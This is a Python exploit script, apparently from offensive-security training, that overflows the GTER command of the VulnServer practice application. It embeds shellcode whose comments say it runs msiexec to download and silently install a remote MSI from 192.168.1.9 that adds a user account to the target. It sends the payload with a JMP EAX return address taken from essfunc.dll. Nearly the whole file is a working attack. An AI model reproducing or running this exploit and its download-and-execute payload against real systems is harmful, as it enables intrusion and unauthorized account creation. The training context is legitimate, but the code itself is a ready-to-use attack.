#!/usr/bin/python

#
# This python script is to be used for VulnServer fuzzing
# I created it during following CTP training
# If you are reading this, you either need help with your fuzzing or enjoy
# my terrible humor. Either way, you are crazy ....
# enjoy!
#
import socket
import os
import sys
import time
#

#
# Three Arguments, including the script itself. 
#
if len(sys.argv) != 3:
    print "[-] Three arguments, really?\n"
    print "[-] Usage: ./thisfile.py <ip> <port> <param> <max size> <interval>\n" 
    print "[-] Example: ./thisfile.py 192.168.1.66 9999\n"
    print "[-] Try Harder!\n"
    sys.exit()


print "[-] Hello, looks like you survived the parameter quiz!\n"
print "[-] This script is designed exploit the VulnServer GTER parameter.\n"
print "[-] You can change it to something else if you want!\n"
time.sleep(2)
#
# Define the script arguments.
# Hey what sucks more, added 5 arguments to a script, or rewriting the script everytime you need to change something?
# Answer, they suck equally but bash will let you arrow up your last xxx commands.
#
ip = sys.argv[1]
port = int(sys.argv[2])

#
# Port, Size and interval (above) need to be expressed as integers
#

# Define the variables "patch borrow and  "crash"



# Patch reverses the interpretation of GTER at the beginning of the buffer

patch="\x90\x90\x90\x90\x5a\x4d\x5c\x4f\x90\x90"

# Borrow is the shellcode from exploit-db, customized for this attack
# Payload is msiexec /i http://192.168.1.9/ms.msi /qn
# ms.msi will add a user to the target system

borrow="\x31\xc0\x50\x68\x20\x2f\x71\x6e\x68\x2e\x6d\x73\x69\x68\x39\x2f\x6d\x73\x68\x38\x2e\x31\x2e\x68\x32\x2e\x31\x36\x68\x2f\x2f\x31\x39\x68\x74\x74\x70\x3a\x68\x2f\x69\x20\x68\x68\x78\x65\x63\x20\x68\x6d\x73\x69\x65\x89\xe7\x57\xb8\x4b\x80\xc0\x76\xff\xd0\x31\xc0\x50\xb8\xd8\x41\xf6\x76\xff\xd0"

crash=patch
crash+=borrow
crash+="A" * (150 - len(patch + borrow)) # Dropped from 151 to account for extra space after GTER
crash+="\xb1\x11\x50\x62" # JMP EAX essfunc.dll
crash+="C" * 95 # Fills out the rest of the buffer 

buffer="GTER"
buffer+="  " # Two spaces, accounted for in buffer total size while calculating crash.
buffer+=crash + "\n"

print "[-] Here we go, sending the exploit, %s bytes to Vulnserver: " %len(crash)

expl = socket.socket ( socket.AF_INET, socket.SOCK_STREAM )
expl.connect((ip, port))
expl.send("HELP\n")
time.sleep(.25)
expl.send(buffer)
time.sleep(.25)
expl.send("EXIT\n")
expl.close
time.sleep(.5)

print "[-] Done\n"

exit()
